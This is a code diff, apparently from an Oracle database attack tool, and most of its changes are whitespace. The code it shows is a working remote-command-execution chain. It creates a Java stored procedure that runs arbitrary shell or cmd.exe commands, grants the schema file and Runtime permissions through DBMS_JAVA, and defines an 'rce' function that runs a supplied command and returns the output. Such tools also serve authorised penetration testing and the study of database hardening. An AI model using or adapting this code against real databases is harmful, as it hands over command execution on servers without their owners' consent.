@@ -67,7 +67,6 @@ def getHost(cur):
 		query = "SELECT UTL_INADDR.GET_HOST_NAME FROM dual"
 		cur.execute(query)
 		result = cur.fetchone()
-		normal("Host:%s"%result)
 		return result
 	except Exception as e:
 		error(e)
@@ -97,8 +96,8 @@ def CreatePLSQL(platform,charset,cur,role):
 		      finalCommand[0] = "/bin/sh";
 		      finalCommand[1] = "-c";
 		      finalCommand[2] = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/git/bin:/usr/local/sbin:~/bin;export PATH;"+command;
-			  final Process pr = Runtime.getRuntime().exec(finalCommand);
-			  pr.waitFor();
+		      final Process pr = Runtime.getRuntime().exec(finalCommand);
+		      pr.waitFor();
 		      
 		      new Thread(new Runnable(){
 		        public void run() {
@@ -163,14 +162,14 @@ def CreatePLSQL(platform,charset,cur,role):
 		public class Host {
 		  public static void executeCommand(String command) {
 		    try {
-              final File file = new File("c:\\\\users\\\\public\\\\f0f7f381d3dc9254b0e19a1c42d8325c-oraclexec.l0g");
-              if(file.exists()){file.delete();}
+                      final File file = new File("c:\\\\users\\\\public\\\\f0f7f381d3dc9254b0e19a1c42d8325c-oraclexec.l0g");
+                      if(file.exists()){file.delete();}
 		      String[] finalCommand;
 		      String[] initialCommand;
 		      initialCommand = new String[3];
-              initialCommand[0] = "cmd.exe";
-              initialCommand[1] = "/c";
-              initialCommand[2] = "C:\\\\windows\\\\system32\\\\cmd.exe /y /C "+"\\""+command+">c:\\\\users\\\\public\\\\f0f7f381d3dc9254b0e19a1c42d8325c-oraclexec.l0g 2>&1\\"";
+                      initialCommand[0] = "cmd.exe";
+                      initialCommand[1] = "/c";
+                      initialCommand[2] = "C:\\\\windows\\\\system32\\\\cmd.exe /y /C "+"\\""+command+">c:\\\\users\\\\public\\\\f0f7f381d3dc9254b0e19a1c42d8325c-oraclexec.l0g 2>&1\\"";
 		      final Process pr = Runtime.getRuntime().exec(initialCommand);
 		      pr.waitFor();
               
@@ -185,7 +184,7 @@ def CreatePLSQL(platform,charset,cur,role):
 		                }
 		            System.out.println(sb.toString());
 		            isr.close();
-                    file.delete();
+                            file.delete();
 		          }
 		          catch (IOException ioe) {
 		            System.out.println("Exception caught printing process output.");
@@ -198,7 +197,7 @@ def CreatePLSQL(platform,charset,cur,role):
 		          }
 		        }
 		      }).start();
-           }
+		    }
 		    catch (Exception ex) {
 		      System.out.println(ex.getLocalizedMessage());
 		    }
@@ -208,20 +207,20 @@ def CreatePLSQL(platform,charset,cur,role):
 
     
 	query2 = """
-		CREATE OR REPLACE PROCEDURE host_command (p_command  IN  VARCHAR2)
-		AS LANGUAGE JAVA 
-		NAME 'Host.executeCommand (java.lang.String)';
+	CREATE OR REPLACE PROCEDURE host_command (p_command  IN  VARCHAR2)
+	AS LANGUAGE JAVA 
+	NAME 'Host.executeCommand (java.lang.String)';
 	"""
 
 	query3 = """
-		DECLARE
-		  l_schema VARCHAR2(30) := '%s';
-		BEGIN
-		  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
-		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
-		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
-		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'setIO', '' );
-		END;
+	DECLARE
+		l_schema VARCHAR2(30) := '%s';
+	BEGIN
+		DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
+		DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
+		DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
+		DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'setIO', '' );
+	END;
 	"""%role
 	#setIO: read and write file
 	try:
@@ -264,14 +263,14 @@ def command_encrypt(platform,cmd):
 def rce(cur,cmd):
 	query = """
 	DECLARE
-		  l_output DBMS_OUTPUT.chararr;
-		  l_lines  INTEGER := 1024000;
+                l_output DBMS_OUTPUT.chararr;
+                l_lines  INTEGER := 1024000;
 	BEGIN
-		host_command('%s');
-		DBMS_OUTPUT.get_lines(l_output, l_lines);
-		FOR i IN 1 .. l_lines LOOP
-			DBMS_OUTPUT.put_line(l_output(i));
-		END LOOP;
+                host_command('%s');
+                DBMS_OUTPUT.get_lines(l_output, l_lines);
+                FOR i IN 1 .. l_lines LOOP
+                        DBMS_OUTPUT.put_line(l_output(i));
+                END LOOP;
 	END;
 	"""%(cmd)
 	cur.execute(query)
